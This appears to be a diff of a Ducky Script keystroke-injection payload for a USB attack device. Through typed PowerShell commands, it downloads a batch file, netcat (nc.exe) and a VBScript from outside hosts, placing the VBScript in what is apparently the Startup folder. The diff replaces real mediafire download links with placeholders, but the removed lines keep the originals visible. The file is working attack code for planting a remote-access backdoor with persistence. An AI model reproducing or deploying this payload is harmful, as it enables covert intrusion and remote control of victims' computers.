@@ -34,15 +34,15 @@ STRING $client = new-object System.Net.WebClient
 DELAY 100
 ENTER
 DELAY 100
-STRING $client.DownloadFile("https://download1497.mediafire.com/8m313dl9bqqg/kluwkdgi8v6dovl/b.bat","$us\b.bat")
+STRING $client.DownloadFile("link_1_descarga.directa","$us\b.bat")
 DELAY 100
 ENTER
 DELAY 4000
-STRING $client.DownloadFile("https://download1585.mediafire.com/25w5mwh6g4kg/ncd5kz7z6bv0bsa/nc.exe","$us\nc.exe")
+STRING $client.DownloadFile("link_2_descarga.directa","$us\nc.exe")
 DELAY 100
 ENTER
 DELAY 4000
-STRING $client.DownloadFile("https://download1338.mediafire.com/gvrx9wxzrjzg/ohgvexnnc6axq1d/e.vbs","$st\e.vbs")
+STRING $client.DownloadFile("link_3_descarga.directa","$st\e.vbs")
 DELAY 100
 ENTER
 DELAY 4000
